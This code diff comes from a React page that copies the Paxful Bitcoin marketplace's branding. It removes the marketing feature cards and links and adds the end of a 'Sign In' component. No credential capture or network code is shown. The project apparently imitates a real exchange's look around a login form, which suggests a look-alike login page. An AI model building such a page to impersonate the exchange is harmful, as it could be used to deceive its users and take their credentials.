-                d='M4 8a2 2 0 012-2h20a2 2 0 012 2v18a2 2 0 01-2 2H6a2 2 0 01-2-2V8z'
-                opacity='0.15'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M1 5a2 2 0 012-2h20a2 2 0 012 2v18a2 2 0 01-2 2H3a2 2 0 01-2-2V5z'
-              ></path>
-              <path
-                fill='#00A5EF'
-                d='M25 6H6a2 2 0 00-2 2v17h21V6z'
-                opacity='0.2'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M0 5a3 3 0 013-3h20a3 3 0 013 3v18a3 3 0 01-3 3H3a3 3 0 01-3-3V5zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h20a1 1 0 001-1V5a1 1 0 00-1-1H3z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                d='M8 15a1 1 0 110-2h10a1 1 0 110 2H8z'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M12.293 19.707a1 1 0 010-1.414L16.586 14l-4.293-4.293a1 1 0 011.414-1.414l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0z'
-                clipRule='evenodd'
-              ></path>
-            </svg>
-            <strong
-              style={serrat.style}
-              className='text-[#494949] ml-4 lg:ml-0 my-2 text-base'
-            >
-              {"Buy Bitcoin"}
-            </strong>
-            <p className='mb-0 text-xs max-w-[296px] text-center text-[#333]'>
-              <a
-                className='text-appBlue2'
-                href='https://paxful.com/buy-bitcoin'
-              >
-                Buy Bitcoin
-              </a>{" "}
-              from real people in our peer-to-peer Marketplace.
-            </p>
-          </div>
-          <div className='flex flex-col items-center'>
-            <svg
-              fill='none'
-              viewBox='0 0 48 48'
-              className='w-[32px] h-[32px] lg:w-[48px] lg:h-[48px]'
-            >
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M27 19h2v2h2v-2h2v2.126a4.002 4.002 0 012.063 6.447A4 4 0 0133 35v2h-2v-2h-2v2h-2v-2h-2v-2h2V23h-2v-2h2v-2zm2 14h4a2 2 0 100-4h-4v4zm0-6h3a2 2 0 100-4h-3v4z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M30 44c8.837 0 16-7.163 16-16s-7.163-16-16-16-16 7.163-16 16 7.163 16 16 16zm0 2c9.941 0 18-8.059 18-18s-8.059-18-18-18-18 8.059-18 18 8.059 18 18 18z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                d='M4 8a2 2 0 012-2h20a2 2 0 012 2v18a2 2 0 01-2 2H6a2 2 0 01-2-2V8z'
-                opacity='0.15'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M1 5a2 2 0 012-2h20a2 2 0 012 2v18a2 2 0 01-2 2H3a2 2 0 01-2-2V5z'
-              ></path>
-              <path
-                fill='#00A5EF'
-                d='M25 6H6a2 2 0 00-2 2v17h21V6z'
-                opacity='0.2'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M0 5a3 3 0 013-3h20a3 3 0 013 3v18a3 3 0 01-3 3H3a3 3 0 01-3-3V5zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h20a1 1 0 001-1V5a1 1 0 00-1-1H3z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                d='M8 15a1 1 0 110-2h10a1 1 0 110 2H8z'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M12.293 19.707a1 1 0 010-1.414L16.586 14l-4.293-4.293a1 1 0 011.414-1.414l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0z'
-                clipRule='evenodd'
-              ></path>
-            </svg>
-            <strong
-              style={serrat.style}
-              className='text-[#494949] ml-4 lg:ml-0 my-2 text-base'
-            >
-              {"Sell Bitcoin"}
-            </strong>
-            <p className='mb-0 text-xs max-w-[296px] text-center text-[#333]'>
-              Set your own rates and choose how you want to be paid.
-            </p>
-          </div>
-          <div className='flex flex-col items-center'>
-            <svg
-              fill='none'
-              viewBox='0 0 48 48'
-              className='w-[32px] h-[32px] lg:w-[48px] lg:h-[48px]'
-            >
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M23.329 43.012l3.372 2.88a2 2 0 002.598 0l16-13.659A2 2 0 0046 30.712V9.76a2 2 0 00-1.663-1.972l-5.562-.95A2 2 0 0139 7.76v20.95a2 2 0 01-.702 1.522l-14.97 12.78z'
-                clipRule='evenodd'
-                opacity='0.15'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M21 1.985l16.505 2.818A3 3 0 0140 7.761v20.95a3 3 0 01-1.052 2.283l-16 13.658a3 3 0 01-3.896 0l-16-13.659A3 3 0 012 28.713V7.76a3 3 0 012.495-2.958L21 1.985zm0 2.03L4.832 6.774A1 1 0 004 7.76v20.95a1 1 0 00.35.761l16 13.659a1 1 0 001.3 0l16-13.659a1 1 0 00.35-.76V7.76a1 1 0 00-.832-.986L21 4.015z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M9 12.736a2 2 0 011.663-1.971L21 9l10.337 1.765A2 2 0 0133 12.736v13.098a2 2 0 01-.702 1.52l-10 8.538a2 2 0 01-2.596 0l-10-8.537A2 2 0 019 25.834V12.736z'
-              ></path>
-              <path
-                fill='#00A5EF'
-                d='M12 15.663a2 2 0 011.578-1.955L21.5 12l9.925 2.158A2 2 0 0133 16.112v8.98a2 2 0 01-.683 1.506l-10.032 8.777a2 2 0 01-2.597.032L12.72 29.6a2 2 0 01-.72-1.537v-12.4z'
-                opacity='0.2'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M21 7.985L31.505 9.78A3 3 0 0134 12.736v13.098a3 3 0 01-1.052 2.281l-10 8.537a3 3 0 01-3.896 0l-10-8.537A3 3 0 018 25.834V12.736a3 3 0 012.495-2.957L21 7.985zm0 2.03L10.832 11.75a1 1 0 00-.832.985v13.098a1 1 0 00.35.76l10 8.537a1 1 0 001.3 0l10-8.537a1 1 0 00.35-.76V12.736a1 1 0 00-.832-.986L21 10.014z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M24 21a3 3 0 11-6 0 3 3 0 016 0z'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M21 19a2 2 0 100 4 2 2 0 000-4zm-4 2a4 4 0 118 0 4 4 0 01-8 0z'
-                clipRule='evenodd'
-              ></path>
-            </svg>
-            <strong
-              style={serrat.style}
-              className='text-[#494949] ml-4 lg:ml-0 my-2 text-base'
-            >
-              {"Secure Trading"}
-            </strong>
-            <p className='mb-0 text-xs max-w-[296px] text-center text-[#333]'>
-              Bitcoin is held in secure escrow until a trade is successfully
-              completed.
-            </p>
-          </div>
-          <div className='flex flex-col items-center'>
-            <svg
-              fill='none'
-              viewBox='0 0 48 48'
-              className='w-[32px] h-[32px] lg:w-[48px] lg:h-[48px]'
-            >
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                fillRule='evenodd'
-                d='M11.273 8.545c1.07-2.332 4.384-2.332 5.454 0l1.27 2.77A11 11 0 0119 15.903V28L9 40V15.903c0-1.584.342-3.149 1.002-4.588l1.271-2.77z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='#00A5EF'
-                d='M13 15.99V35.5l5-6.5V14l-2.5-5.5-1.518 3.169a10 10 0 00-.982 4.32z'
-                opacity='0.2'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M13.091 9.379a1 1 0 011.818 0l1.271 2.77a9 9 0 01.82 3.754V16h-6v-.097a9 9 0 01.82-3.754l1.271-2.77zM11 18v20l-2 2V15.903c0-1.584.342-3.149 1.002-4.588l1.271-2.77c1.07-2.332 4.384-2.332 5.454 0l1.27 2.77A11 11 0 0119 15.903V30.5h-2V18h-6z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                fillRule='evenodd'
-                d='M31.273 8.545c1.07-2.332 4.384-2.332 5.454 0l1.27 2.77A11 11 0 0139 15.903V40L29 28V15.903a11 11 0 011.002-4.588l1.271-2.77z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='#00A5EF'
-                d='M35 15.99V35.5L30 29V14l2.5-5.5 1.518 3.169a10 10 0 01.982 4.32z'
-                opacity='0.2'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M33.091 9.379a1 1 0 011.818 0l1.271 2.77a9 9 0 01.82 3.754V16h-6v-.097a9 9 0 01.82-3.754l1.271-2.77zM31 18v12.5h-2V15.903a11 11 0 011.002-4.588l1.271-2.77c1.07-2.332 4.384-2.332 5.454 0l1.27 2.77A11 11 0 0139 15.903V40l-2-2V18h-6z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M25.747 1.081c-.762-1.369-2.732-1.369-3.494 0L18.39 8.013A11 11 0 0017 13.367v15.304l-6.653 9.03-5.553 2.578C1.879 41.632 2.844 46 6.057 46H19v-3h10v3h12.943c3.213 0 4.178-4.368 1.263-5.721l-5.553-2.578L31 28.67V13.367a11 11 0 00-1.39-5.354l-3.863-6.932zm-5.61 7.906L24 2.055l3.862 6.932A9 9 0 0129 13.367V41H19V13.367a9 9 0 011.138-4.38zM17 32.043l-5.347 7.256-6.017 2.794c-.972.451-.65 1.907.42 1.907H17V32.043zm14 0l5.347 7.256 6.017 2.794c.972.451.65 1.907-.42 1.907H31V32.043z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M24 13a1 1 0 00-1 1h-2a3 3 0 116 0h-2a1 1 0 00-1-1z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                d='M23 20a1 1 0 112 0v13a1 1 0 11-2 0V20z'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M22 38a4.998 4.998 0 014.334 2.505A2.986 2.986 0 0128 40c.675 0 1.299.223 1.8.6a4.003 4.003 0 012.256-1.488 7.001 7.001 0 0113.893.041A3.001 3.001 0 0148 42v1a5 5 0 01-5 5H5a5 5 0 01-5-5v-1c0-1.325.86-2.45 2.05-2.847a7.001 7.001 0 0113.894-.04 3.995 3.995 0 011.913 1.087A4.995 4.995 0 0122 38z'
-              ></path>
-              <path
-                fill='#00A5EF'
-                d='M22 43a4.998 4.998 0 014.334 2.505A2.986 2.986 0 0128 45c.675 0 1.299.223 1.8.6a4.003 4.003 0 012.256-1.488 7.001 7.001 0 0113.893.041C48.5 47 44 45.675 44 47H4c0-1.325-4 0-1.95-2.847a7.001 7.001 0 0113.894-.04 3.995 3.995 0 011.913 1.087A4.995 4.995 0 0122 43z'
-                opacity='0.2'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M9 35a5 5 0 00-5 5 1 1 0 01-1 1 1 1 0 00-1 1v2a2 2 0 002 2h40a2 2 0 002-2v-2a1 1 0 00-1-1 1 1 0 01-1-1 5 5 0 00-10 0 1 1 0 01-1 1 2 2 0 00-2 2 1 1 0 11-2 0 1 1 0 10-2 0 1 1 0 11-2 0 3 3 0 10-6 0 1 1 0 11-2 0 2 2 0 00-2-2 1 1 0 01-1-1 5 5 0 00-5-5zm17.334 5.505A4.998 4.998 0 0022 38a4.995 4.995 0 00-4.143 2.2 3.995 3.995 0 00-1.913-1.088 7.001 7.001 0 00-13.893.041A3.001 3.001 0 000 42v2a4 4 0 004 4h40a4 4 0 004-4v-2c0-1.325-.86-2.45-2.05-2.847a7.001 7.001 0 00-13.894-.04A4.003 4.003 0 0029.8 40.6 2.987 2.987 0 0028 40c-.616 0-1.19.186-1.666.505z'
-                clipRule='evenodd'
-              ></path>
-            </svg>
-            <strong
-              style={serrat.style}
-              className='text-[#494949] ml-4 lg:ml-0 my-2 text-base'
-            >
-              {"Valueable feedback"}
-            </strong>
-            <p className='mb-0 text-xs max-w-[296px] text-center text-[#333]'>
-              Our feedback system highlights reliable, experienced users,
-              helping you to trade smoothly.
-            </p>
-          </div>
-          <div className='flex flex-col items-center'>
-            <svg
-              fill='none'
-              viewBox='0 0 48 48'
-              className='w-[32px] h-[32px] lg:w-[48px] lg:h-[48px]'
-            >
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M30 4a3 3 0 100 6 3 3 0 000-6zm-5 3a5 5 0 1110 0 5 5 0 01-10 0zM8 16a3 3 0 00-3 3v24a3 3 0 003 3h30a3 3 0 003-3V23a3 3 0 00-3-3h-1v-1a3 3 0 00-3-3H8zm27 4v-1a1 1 0 00-1-1H8a1 1 0 00-1 1v1h28zM7 22v21a1 1 0 001 1h30a1 1 0 001-1V23a1 1 0 00-1-1H7z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M33 32a2 2 0 012-2h6a2 2 0 012 2v2a2 2 0 01-2 2h-6a2 2 0 01-2-2v-2z'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M32 32a3 3 0 013-3h6a3 3 0 013 3v2a3 3 0 01-3 3h-6a3 3 0 01-3-3v-2zm3-1a1 1 0 00-1 1v2a1 1 0 001 1h6a1 1 0 001-1v-2a1 1 0 00-1-1h-6z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                d='M32 21c0 6.075-4.925 11-11 11s-11-4.925-11-11 4.925-11 11-11 11 4.925 11 11z'
-                opacity='0.15'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M32 16c0 6.075-4.925 11-11 11s-11-4.925-11-11S14.925 5 21 5s11 4.925 11 11z'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M21 6c-5.523 0-10 4.477-10 10s4.477 10 10 10 10-4.477 10-10S26.523 6 21 6zM9 16C9 9.373 14.373 4 21 4s12 5.373 12 12-5.373 12-12 12S9 22.627 9 16z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='#00A5EF'
-                d='M32 17.429c0 5.207-4.925 9.428-11 9.428s-11-4.221-11-9.428C10 12.22 14.925 8 21 8s11 4.221 11 9.429z'
-                opacity='0.2'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M18.414 18.606v-6.485H17v-2h1.414V9h1.414v1.121h1.414V9h1.415v1.202a3.122 3.122 0 011.878 4.79 3.121 3.121 0 01-1.878 5.614v1.121h-1.415v-1.12h-1.414v1.12h-1.414v-1.12H17v-2h1.414zm1.414 0h2.829a1.121 1.121 0 000-2.242h-2.829v2.242zm0-4.242V12.12h2.122a1.121 1.121 0 010 2.243h-2.122z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                d='M10 26a1 1 0 112 0v11a1 1 0 11-2 0V26z'
-              ></path>
-            </svg>
-            <strong
-              style={serrat.style}
-              className='text-[#494949] ml-4 lg:ml-0 my-2 text-base'
-            >
-              {"Free Paxful Wallet"}
-            </strong>
-            <p className='mb-0 text-xs max-w-[296px] text-center text-[#333]'>
-              Get a free{" "}
-              <a
-                className='text-appBlue2'
-                href='https://paxful.com/bitcoin-wallet'
-              >
-                Paxful Wallet
-              </a>{" "}
-              when you sign up to receive, send, and store your Bitcoin safely.
-            </p>
-          </div>
-          <div className='flex flex-col items-center'>
-            <svg
-              fill='none'
-              viewBox='0 0 48 48'
-              className='w-[32px] h-[32px] lg:w-[48px] lg:h-[48px]'
-            >
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                d='M33 17a9 9 0 11-18 0 9 9 0 0118 0z'
-                opacity='0.15'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M33 12a9 9 0 11-18 0 9 9 0 0118 0z'
-              ></path>
-              <path
-                fill='#00A5EF'
-                d='M33 13.5c0 4.142-4.03 7.5-9 7.5s-9-3.358-9-7.5C15 9.358 19.03 6 24 6s9 3.358 9 7.5z'
-                opacity='0.2'
-              ></path>
-              <path
-                fill='var(--icons-bg-fill, #ffffff)'
-                d='M27 10a3 3 0 11-6 0 3 3 0 016 0z'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M24 8a2 2 0 100 4 2 2 0 000-4zm-4 2a4 4 0 118 0 4 4 0 01-8 0z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-primary, #0097db)'
-                fillRule='evenodd'
-                d='M16 12a8 8 0 1113.253 6.034 4.705 4.705 0 00-1.203-1.013C26.965 16.371 25.53 16 24 16c-1.53 0-2.965.37-4.05 1.021-.451.271-.87.61-1.203 1.012A7.982 7.982 0 0116 12zm4.423 7.158A7.967 7.967 0 0024 20c1.286 0 2.5-.303 3.577-.842a2.912 2.912 0 00-.556-.422C26.296 18.301 25.231 18 24 18c-1.23 0-2.296.301-3.021.736-.232.14-.415.282-.556.422zM24 2c-5.523 0-10 4.477-10 10s4.477 10 10 10 10-4.477 10-10S29.523 2 24 2z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M8 36a4 4 0 100 8 4 4 0 000-8zm-6 4a6 6 0 1112 0 6 6 0 01-12 0zm38-4a4 4 0 100 8 4 4 0 000-8zm-6 4a6 6 0 1112 0 6 6 0 01-12 0zm-10-4a4 4 0 100 8 4 4 0 000-8zm-6 4a6 6 0 1112 0 6 6 0 01-12 0z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                d='M13.5 22.902a1 1 0 111.732 1l-4 6.928a1 1 0 01-1.732-1l4-6.928zm20.732 0a1 1 0 00-1.732 1l4 6.928a1 1 0 101.732-1l-4-6.928zM23 31a1 1 0 102 0v-6a1 1 0 10-2 0v6z'
-              ></path>
-            </svg>
-            <strong
-              style={serrat.style}
-              className='text-[#494949] ml-4 lg:ml-0 my-2 text-base'
-            >
-              {"Invite friends"}
-            </strong>
-            <p className='mb-0 text-xs max-w-[296px] text-center text-[#333]'>
-              Get your friends and family to{" "}
-              <a
-                className='text-appBlue2'
-                href='https://paxful.com/bitcoin-affiliate-program'
-              >
-                sign up
-              </a>{" "}
-              for Paxful.
-            </p>
-          </div>
-        </div>
-      </section>
-      <section className='flex flex-col w-full mt-8   items-center py-[20px]'>
-        <h2
-          style={serrat.style}
-          className='text-[#333] w-[85%] leading-snug lg:w-[540px] lg:text-center text-center text-[32px] font-bold mb-2 col-md-6 mx-auto'
-        >
-          Ready to get started?
-        </h2>
-        <p className='small-text max-w-[680px] w-[85%] text-center text-[#333] mb-4 col-md-8 mx-auto'>
-          Explore thousands of offers to buy and sell Bitcoin to kickstart your
-          trading journey.
-        </p>
-        <Link
-          href={"https://paxful.com/register"}
-          className='px-[16px] hover:bg-[#0091d2] py-[12px] rounded-[8px] bg-appBlue text-white font-semibold mt-4'
-        >
-          Create Your Account
-        </Link>
-        <div className='w-full lg:w-[70%] relative mt-1 h-[30vh]'>
-          <Image className='object-cover' src={"/bg.webp"} fill alt='bg' />
-        </div>
-      </section>
-      <Footer />
-    </main>
+          <p
+            className={`${
+              isLoading || error1 || error2 ? "text-black" : "text-black"
+            } font-semibold  mx-auto`}
+          >
+            {isLoading ? "Loading..." : "Sign In"}
+          </p>
+        </button>
+      </div>
+    </div>
   );
-}
+};
+
+export default Index;
